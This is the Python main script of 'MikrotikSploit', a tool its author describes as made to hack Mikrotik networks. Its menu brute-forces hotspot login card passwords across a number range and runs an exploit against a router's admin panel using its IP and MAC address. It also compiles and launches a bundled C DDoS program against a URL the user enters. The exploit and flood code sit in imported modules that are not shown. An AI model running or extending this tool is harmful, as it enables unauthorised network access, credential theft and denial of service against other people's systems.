#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

import sys
import os
import time

from tools import asc
from color import *

sys.path.append('core/ex818m/')
from ex818m import MAIN, write

sys.path.append('core/ExploitPanelAdmin/')
from find import MAC
from run import RUN


def CLEAR():
    if sys.platform.startswith("win") is True:
        os.system("clr")
    else:
        os.system("clear")


def timeS():
    s = time.ctime().replace(' ', ':').split(':')[3:6]
    m = f"[{s[0]}:{s[1]}:{s[2]}]"
    return m


class LOOP:
    def __init__(self):
        self._NUM_ = int()
        self.find = True
        self.find1 = True
        self.find2 = True


    def LOOPS(self):

        global ADDR,MACK

        try:
            while True:

                self._ASC_ = asc()

                if self._ASC_.strip() is "1":
                    Next_Url = "login"
                    url = input(f"{W}[{P} * {W}]{B} Enter the URL Page Login{N}: ")
                    asc_url = input(f"{W}[{P} * {W}]{B} the Next Url is {Next_Url} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
                    if asc_url == "N":
                        Next_Url = input(f"{W}[{P} * {W}]{B} Enter the Next URL Page Login{N}: ")
                    else: pass
                    minnum = input(f"{W}[{P} * {W}]{B} Enter the Min Number {N}: ")
                    maxnum = input(f"{W}[{P} * {W}]{B} Enter the Max Number {N}: ")

                    try:
                        MAIN.run(True, url, 80, f"{minnum},{maxnum}",
                                 f"/{Next_Url}" if "/" not in Next_Url else Next_Url
                                 )
                    except:
                        open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                        f" Error Getting Password Cards Page Login My Network\n{timeS()} Error "
                        f"Url={url} Min Number={minnum} Max Number={maxnum}")

                elif self._ASC_.strip() is "2":
                    try:
                        ADDR,MACK = MAC().soRun()
                    except:
                        self.find = False
                        open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                        f" Error Exploit Mikrotik Admin Panel\n{timeS()} Error "
                        f"IP=? MACK=?")

                        sys.exit(2)

                    if self.find is True:
                        asc1 = input(f"{W}[{P} * {W}]{B} IP Address Your Router {ADDR} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
                        if asc1 == "N":self.find1= False
                        else:":ADDR = ADDR"

                    if self.find1 is False:
                        if self.find is False:ADDR = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")
                        else:ADDR = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")

                    # End IP Address

                    if self.find is True:
                        asc2 = input(f"{W}[{P} * {W}]{B} MAC Address Your Router {MACK} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
                        if asc2 == "N":self.find2 = False
                        else :MACK = MACK

                    if self.find2 is False:
                        if self.find is False:MACK = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")
                        else:MACK = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")

                    # End MAC Router

                    try:
                        write(f"\n\n{WOW}Exploiting .................{N}", 10)
                        run = RUN.soRun(True, MACK)
                        print(run)

                    except:
                        print(f"{W}[{R} - {W}]{B} Sorry Not Find Exploit For Your Router {N}")

                elif self._ASC_.strip() is "3":
                    url = input(f"{W}[{P} * {W}]{B} Enter the URL For DoDs{N}: ")
                    write(f"{WOW}WHITE .................{N}", 10)
                    url = url.replace("http://", "") \
                        if url.startswith("http://") \
                        else url

                    os.system("gcc -s ./core/DDoS/DDoS.c -o ./core/DDoS/DDoS")
                    try:
                        " %s " % os.system(f"./core/DDoS/DDoS {url} {80}")
                    except:
                        open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                        f" DDoS for Your NetWork\n{timeS()} Error "
                        f"Url={url} Port={80}")

                elif self._ASC_.strip() is "4":
                    print(""" 
Name        : Hathem Ahmed (MHM)
Facebook    : https://FB.COM/mhm.hack
Github      : https://github.com/HathemAhmed
Version     : v0.1
info script : this script for Hack Networks Mikrotik """)
                    input(f"{WOW}\n\n------ (Enter) ------{N}")
                    CLEAR()

                elif self._ASC_.strip() is "5":
                    exit()

                self.find = True
                self.find1 = True
                self.find2 = True

        except KeyboardInterrupt:
            CLEAR()
            self.LOOPS()
